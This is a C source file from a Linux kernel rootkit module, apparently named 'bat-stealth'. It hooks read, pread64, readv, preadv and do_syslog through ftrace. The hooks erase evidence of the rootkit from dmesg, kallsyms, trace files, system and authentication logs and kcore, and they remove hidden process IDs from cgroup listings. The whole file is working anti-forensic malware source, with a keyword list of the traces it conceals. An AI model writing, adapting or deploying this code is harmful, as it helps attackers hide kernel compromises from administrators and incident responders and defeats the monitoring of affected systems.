/* clear_taint_dmesg.c — Suppress bat-stealth evidence from dmesg/logs.
 *
 * Hooks:
 *   - sys_read / sys_pread64 / sys_readv / sys_preadv:
 *       Filter sensitive lines from: kmsg, kallsyms, enabled_functions,
 *       trace, trace_pipe, touched_functions, kern.log, syslog, auth.log,
 *       vmallocinfo, kcore, /proc/net/nf_conntrack
 *   - do_syslog: Filter SYSLOG_ACTION_READ* responses
 *   - sched_debug_show: Filter /proc/sched_debug entries
 *
 * Port from Singularity — ARCH_SYS() + REGS_ARGn for portability.
 * External deps on hooks_write.c (saved_ftrace_value, ftrace_write_intercepted)
 * replaced with local stubs (hooks_write.c is out of scope for bat-stealth S2).
 */
#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/clear_taint_dmesg.h"
#include "../include/pid_manager.h"

/* Stubs for hooks_write.c dependency (not included in bat-stealth) */
static const char saved_ftrace_value[] = "1\n";
static const bool ftrace_write_intercepted = false;

#define MAX_CAP            (1024 * 1024)
#define SYSLOG_ACTION_READ       2
#define SYSLOG_ACTION_READ_ALL   3
#define SYSLOG_ACTION_READ_CLEAR 4

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_preadv)(const struct pt_regs *regs);
static asmlinkage ssize_t (*orig_readv)(const struct pt_regs *regs);
static int (*orig_sched_debug_show)(struct seq_file *m, void *v);
static int (*orig_do_syslog)(int type, char __user *buf, int len, int source);

/* Forward declaration */
static notrace bool line_contains_sensitive_info(const char *line);

/* ── File type predicates ─────────────────────────────────────────── */

static const char *virtual_fs_types[] = {
    "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
};

static notrace bool is_virtual_file(struct file *file)
{
    const char *fsname;
    int i;

    if (!file || !file->f_path.mnt || !file->f_path.mnt->mnt_sb ||
        !file->f_path.mnt->mnt_sb->s_type)
        return false;

    fsname = file->f_path.mnt->mnt_sb->s_type->name;
    if (!fsname) return false;

    for (i = 0; virtual_fs_types[i]; i++) {
        if (strcmp(fsname, virtual_fs_types[i]) == 0)
            return true;
    }
    return false;
}

static notrace bool is_trace_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;

    if (!file || !file->f_path.dentry) return false;
    dentry = file->f_path.dentry;
    name   = dentry->d_name.name;
    if (!name || strcmp(name, "trace") != 0) return false;
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb) return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name) return false;
    return (strcmp(sb->s_type->name, "tracefs") == 0 ||
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace bool is_trace_pipe_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;

    if (!file || !file->f_path.dentry) return false;
    dentry = file->f_path.dentry;
    name   = dentry->d_name.name;
    if (!name || strcmp(name, "trace_pipe") != 0) return false;
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb) return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name) return false;
    return (strcmp(sb->s_type->name, "tracefs") == 0 ||
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace bool is_enabled_functions_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;

    if (!file || !file->f_path.dentry) return false;
    dentry = file->f_path.dentry;
    name   = dentry->d_name.name;
    if (!name || strcmp(name, "enabled_functions") != 0) return false;
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb) return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name) return false;
    return (strcmp(sb->s_type->name, "tracefs") == 0 ||
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace bool is_touched_functions_file(struct file *file)
{
    const char *name;
    struct dentry *dentry;
    struct super_block *sb;

    if (!file || !file->f_path.dentry) return false;
    dentry = file->f_path.dentry;
    name   = dentry->d_name.name;
    if (!name || strcmp(name, "touched_functions") != 0) return false;
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb) return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name) return false;
    return (strcmp(sb->s_type->name, "tracefs") == 0 ||
            strcmp(sb->s_type->name, "debugfs") == 0);
}

static notrace bool is_cgroup_pid_file(struct file *file)
{
    const char *name;
    struct super_block *sb;

    if (!file || !file->f_path.dentry) return false;
    name = file->f_path.dentry->d_name.name;
    if (!name) return false;
    if (strcmp(name, "cgroup.procs") != 0 &&
        strcmp(name, "tasks") != 0 &&
        strcmp(name, "cgroup.threads") != 0)
        return false;
    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb) return false;
    sb = file->f_path.mnt->mnt_sb;
    if (!sb->s_type || !sb->s_type->name) return false;
    return (strcmp(sb->s_type->name, "cgroup") == 0 ||
            strcmp(sb->s_type->name, "cgroup2") == 0);
}

static notrace bool should_filter_file(const char *filename)
{
    if (!filename)
        return false;
    return (strcmp(filename, "kmsg") == 0 ||
            strcmp(filename, "kallsyms") == 0 ||
            strcmp(filename, "enabled_functions") == 0 ||
            strcmp(filename, "debug") == 0 ||
            strcmp(filename, "trace") == 0 ||
            strcmp(filename, "kern.log") == 0 ||
            strcmp(filename, "kern.log.1") == 0 ||
            strcmp(filename, "syslog") == 0 ||
            strcmp(filename, "auth.log") == 0 ||
            strcmp(filename, "auth.log.1") == 0 ||
            strcmp(filename, "vmallocinfo") == 0 ||
            strcmp(filename, "syslog.1") == 0 ||
            strcmp(filename, "trace_pipe") == 0 ||
            strcmp(filename, "kcore") == 0 ||
            strcmp(filename, "touched_functions") == 0);
}

/* ── Line content predicates ─────────────────────────────────────── */

static notrace bool line_contains_sensitive_info(const char *line)
{
    const char *p;

    if (!line)
        return false;

    for (p = line; *p; p++) {
        switch (*p) {
        case '_':
            if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
            break;
        case 'b':
            if (strncmp(p, "bat-stealth", 11) == 0) return true;
            if (strncmp(p, "bat_stealth", 11) == 0) return true;
            break;
        case 'c':
            if (strncmp(p, "create_trampoline+", 18) == 0) return true;
            if (strncmp(p, "constprop", 9) == 0) return true;
            if (strncmp(p, "clear_taint", 11) == 0) return true;
            if (strncmp(p, "called before initial load_policy", 33) == 0)
                return true;
            if (strncmp(p, "cpu_qos_ctrl", 12) == 0) return true;
            if (strncmp(p, "cpu_affinity", 12) == 0) return true;
            break;
        case 'f':
            if (strncmp(p, "filter_kmsg", 11) == 0) return true;
            if (strncmp(p, "fh_install", 10) == 0) return true;
            if (strncmp(p, "fh_remove", 9) == 0) return true;
            if (strncmp(p, "ftrace_helper", 13) == 0) return true;
            if (strncmp(p, "freq_policy", 11) == 0) return true;
            break;
        case 'h':
            if (strncmp(p, "hook", 4) == 0) return true;
            break;
        case 'k':
            if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
            if (strncmp(p, "kperf_qos", 9) == 0) return true;
            break;
        case 'm':
            if (strncmp(p, "mem_limit", 9) == 0) return true;
            break;
        case 'o':
            if (strncmp(p, "out-of-tree module", 18) == 0) return true;
            if (strncmp(p, "obliviate", 9) == 0) return true;
            break;
        case 'q':
            if (strncmp(p, "qos_state", 9) == 0) return true;
            break;
        case 's':
            if (strncmp(p, "sched_reset", 11) == 0) return true;
            break;
        case 't':
            if (strncmp(p, "taint", 5) == 0) return true;
            break;
        case 'u':
            if (strncmp(p, "unrecognized netlink message", 28) == 0) return true;
            if (strncmp(p, "unknown SID", 11) == 0) return true;
            break;
        case 'z':
            if (strncmp(p, "zer0t", 5) == 0) return true;
            break;
        }
    }
    return false;
}

/* ── PID filtering from buffer (cgroup files, etc.) ─────────────── */

static notrace bool is_pid_in_buf(pid_t pid)
{
    int i;
    for (i = 0; i < hidden_count; i++)
        if (hidden_pids[i] == pid) return true;
    return false;
}

static notrace ssize_t filter_hidden_pids_from_buffer(char *buf, ssize_t len)
{
    char *out;
    ssize_t out_len = 0, i = 0;

    if (!buf || len <= 0 || hidden_count <= 0)
        return len;

    out = kmalloc(len + 1, GFP_ATOMIC);
    if (!out)
        return len;

    while (i < len) {
        ssize_t line_start = i, line_end;
        pid_t pid = 0;
        bool skip_line = false;
        ssize_t j;

        while (i < len && buf[i] != '\n') i++;
        line_end = i;
        if (i < len && buf[i] == '\n') i++;

        j = line_start;
        while (j < line_end && buf[j] >= '0' && buf[j] <= '9') {
            pid = pid * 10 + (buf[j] - '0');
            j++;
        }
        if (pid > 0 && is_pid_in_buf(pid))
            skip_line = true;

        if (!skip_line) {
            ssize_t line_len = i - line_start;
            if (line_len > 0 && out_len + line_len <= len) {
                memcpy(out + out_len, buf + line_start, line_len);
                out_len += line_len;
            }
        }
    }

    if (out_len > 0)
        memcpy(buf, out, out_len);

    kfree(out);
    return out_len;
}

static notrace ssize_t filter_cgroup_pids(char __user *user_buf, ssize_t bytes_read)
{
    char *kernel_buf;
    ssize_t filtered_len;

    if (bytes_read <= 0 || !user_buf || hidden_count <= 0)
        return bytes_read;

    kernel_buf = kmalloc(bytes_read + 1, GFP_ATOMIC);
    if (!kernel_buf)
        return bytes_read;

    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return bytes_read;
    }
    kernel_buf[bytes_read] = '\0';

    filtered_len = filter_hidden_pids_from_buffer(kernel_buf, bytes_read);

    if (filtered_len != bytes_read)
        if (copy_to_user(user_buf, kernel_buf, filtered_len))
            filtered_len = bytes_read;

    kfree(kernel_buf);
    return filtered_len;
}

/* ── Buffer content filtering ─────────────────────────────────────── */

static notrace ssize_t filter_buffer_content(char __user *user_buf,
                                               ssize_t bytes_read)
{
    char *kernel_buf, *filtered_buf, *line_start, *line_end;
    size_t filtered_len = 0;

    if (bytes_read <= 0 || !user_buf)
        return bytes_read;
    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return -ENOMEM;
    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kvfree(kernel_buf);
        return -EFAULT;
    }
    kernel_buf[bytes_read] = '\0';

    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
    if (!filtered_buf) {
        kvfree(kernel_buf);
        return -ENOMEM;
    }

    line_start = kernel_buf;
    while ((line_end = strchr(line_start, '\n'))) {
        size_t line_len = line_end - line_start;
        char saved = line_end[0];
        line_end[0] = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + line_len + 1 <= (size_t)bytes_read) {
                memcpy(filtered_buf + filtered_len, line_start, line_len);
                filtered_len += line_len;
                filtered_buf[filtered_len++] = '\n';
            }
        }
        line_end[0] = saved;
        line_start  = line_end + 1;
    }

    if (*line_start && !line_contains_sensitive_info(line_start)) {
        size_t remaining = strlen(line_start);
        if (filtered_len + remaining <= (size_t)bytes_read) {
            memcpy(filtered_buf + filtered_len, line_start, remaining);
            filtered_len += remaining;
        }
    }

    if (filtered_len == 0) {
        kvfree(kernel_buf);
        kvfree(filtered_buf);
        return 0;
    }

    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
        kvfree(kernel_buf);
        kvfree(filtered_buf);
        return -EFAULT;
    }

    kvfree(kernel_buf);
    kvfree(filtered_buf);
    return filtered_len;
}

static notrace ssize_t filter_trace_output(char __user *user_buf,
                                             ssize_t bytes_read)
{
    char *kernel_buf, *filtered_buf, *line_start, *line_end;
    size_t filtered_len = 0;

    if (bytes_read <= 0 || !user_buf)
        return bytes_read;
    if (bytes_read > MAX_CAP)
        bytes_read = MAX_CAP;

    kernel_buf = kvmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return bytes_read;
    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kvfree(kernel_buf);
        return bytes_read;
    }
    kernel_buf[bytes_read] = '\0';

    filtered_buf = kvzalloc(bytes_read + 1, GFP_KERNEL);
    if (!filtered_buf) {
        kvfree(kernel_buf);
        return bytes_read;
    }

    line_start = kernel_buf;
    while ((line_end = strchr(line_start, '\n'))) {
        size_t line_len = line_end - line_start;
        char saved = *line_end;
        *line_end = '\0';
        if (!line_contains_sensitive_info(line_start)) {
            if (filtered_len + line_len + 1 <= (size_t)bytes_read) {
                memcpy(filtered_buf + filtered_len, line_start, line_len);
                filtered_len += line_len;
                filtered_buf[filtered_len++] = '\n';
            }
        }
        *line_end  = saved;
        line_start = line_end + 1;
    }
    if (*line_start && !line_contains_sensitive_info(line_start)) {
        size_t remaining = strlen(line_start);
        if (filtered_len + remaining <= (size_t)bytes_read) {
            memcpy(filtered_buf + filtered_len, line_start, remaining);
            filtered_len += remaining;
        }
    }

    if (filtered_len == 0) {
        kvfree(kernel_buf);
        kvfree(filtered_buf);
        return 0;
    }
    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
        kvfree(kernel_buf);
        kvfree(filtered_buf);
        return -EFAULT;
    }
    kvfree(kernel_buf);
    kvfree(filtered_buf);
    return filtered_len;
}

static notrace ssize_t filter_kmsg_line(char __user *user_buf, ssize_t bytes_read)
{
    char *kernel_buf;
    ssize_t ret;

    if (bytes_read <= 0 || !user_buf)
        return bytes_read;

    kernel_buf = kmalloc(bytes_read + 1, GFP_KERNEL);
    if (!kernel_buf)
        return bytes_read;
    if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
        kfree(kernel_buf);
        return bytes_read;
    }
    kernel_buf[bytes_read] = '\0';
    ret = line_contains_sensitive_info(kernel_buf) ? 0 : bytes_read;
    kfree(kernel_buf);
    return ret;
}

/* ── Hook: sys_read ──────────────────────────────────────────────── */

static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs)
{
    int fd                = (int)REGS_ARG0(regs);
    char __user *user_buf = (char __user *)REGS_ARG1(regs);
    size_t count          = (size_t)REGS_ARG2(regs);
    struct file *file;
    const char *filename;
    ssize_t res, orig_res;

    if (!orig_read || !user_buf)
        return orig_read ? orig_read(regs) : -EINVAL;

    /* Handle ftrace_enabled fake read (stubs — ftrace_write_intercepted always false) */
    (void)count;
    (void)ftrace_write_intercepted;
    (void)saved_ftrace_value;

    orig_res = orig_read(regs);

    if (orig_res <= 0)
        return orig_res;

    file = fget(fd);
    if (!file)
        return orig_res;

    res = orig_res;
    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;

    if (filename && should_filter_file(filename)) {
        if (strcmp(filename, "kmsg") == 0) {
            res = filter_kmsg_line(user_buf, orig_res);
        } else if (is_trace_file(file) || is_trace_pipe_file(file)) {
            res = filter_trace_output(user_buf, orig_res);
        } else {
            res = filter_buffer_content(user_buf, orig_res);
        }
        if (res < 0) res = orig_res;
    } else if (is_cgroup_pid_file(file)) {
        res = filter_cgroup_pids(user_buf, orig_res);
    } else if (is_enabled_functions_file(file) || is_touched_functions_file(file)) {
        res = filter_buffer_content(user_buf, orig_res);
        if (res < 0) res = orig_res;
    }

    fput(file);
    return res;
}

/* ── Hook: sys_pread64 ───────────────────────────────────────────── */

static notrace asmlinkage ssize_t hook_pread64(const struct pt_regs *regs)
{
    int fd                = (int)REGS_ARG0(regs);
    char __user *user_buf = (char __user *)REGS_ARG1(regs);
    struct file *file;
    const char *filename;
    ssize_t orig_res, res;

    if (!orig_pread64)
        return -EINVAL;

    orig_res = orig_pread64(regs);
    if (orig_res <= 0)
        return orig_res;

    file = fget(fd);
    if (!file)
        return orig_res;

    res = orig_res;
    filename = file->f_path.dentry ? file->f_path.dentry->d_name.name : NULL;

    if (filename && should_filter_file(filename)) {
        res = filter_buffer_content(user_buf, orig_res);
        if (res < 0) res = orig_res;
    }

    fput(file);
    return res;
}

/* ── Hook: do_syslog (dmesg) ─────────────────────────────────────── */

static notrace int hook_do_syslog(int type, char __user *buf, int len, int source)
{
    int ret;

    if (!orig_do_syslog)
        return -ENOSYS;

    ret = orig_do_syslog(type, buf, len, source);

    if (ret <= 0)
        return ret;

    if (type == SYSLOG_ACTION_READ ||
        type == SYSLOG_ACTION_READ_ALL ||
        type == SYSLOG_ACTION_READ_CLEAR) {
        ssize_t filtered = filter_buffer_content(buf, ret);
        if (filtered > 0)
            ret = (int)filtered;
    }

    return ret;
}

/* ── Hook: sched_debug_show ──────────────────────────────────────── */

static notrace int hook_sched_debug_show(struct seq_file *m, void *v)
{
    /* Pass through; seq_file filtering would require more invasive approach.
     * The read hook will catch any output that reaches userspace. */
    return orig_sched_debug_show ? orig_sched_debug_show(m, v) : 0;
}

/* ── Hook table ──────────────────────────────────────────────────── */

static struct ftrace_hook hooks[] = {
    HOOK(ARCH_SYS("read"),           hook_read,           &orig_read),
    HOOK(ARCH_SYS("pread64"),        hook_pread64,        &orig_pread64),
    HOOK("do_syslog",                hook_do_syslog,      &orig_do_syslog),
    HOOK("sched_debug_show",         hook_sched_debug_show, &orig_sched_debug_show),
};

/* readv / preadv — optional, non-fatal if symbol missing */
static struct ftrace_hook opt_hooks[] = {
    HOOK(ARCH_SYS("readv"),          hook_read,           &orig_readv),
    HOOK(ARCH_SYS("preadv"),         hook_pread64,        &orig_preadv),
};

/* ── Init / Exit ─────────────────────────────────────────────────── */

int clear_taint_dmesg_init(void)
{
    int i;

    /* Core hooks — require read and pread64 */
    if (fh_install_hooks(hooks, ARRAY_SIZE(hooks)) != 0)
        return -ENOENT;

    /* Optional hooks — ignore failure */
    for (i = 0; i < (int)ARRAY_SIZE(opt_hooks); i++)
        fh_install_hook(&opt_hooks[i]);

    return 0;
}

void clear_taint_dmesg_exit(void)
{
    int i;
    for (i = (int)ARRAY_SIZE(opt_hooks) - 1; i >= 0; i--) {
        if (opt_hooks[i].address)
            fh_remove_hook(&opt_hooks[i]);
    }
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
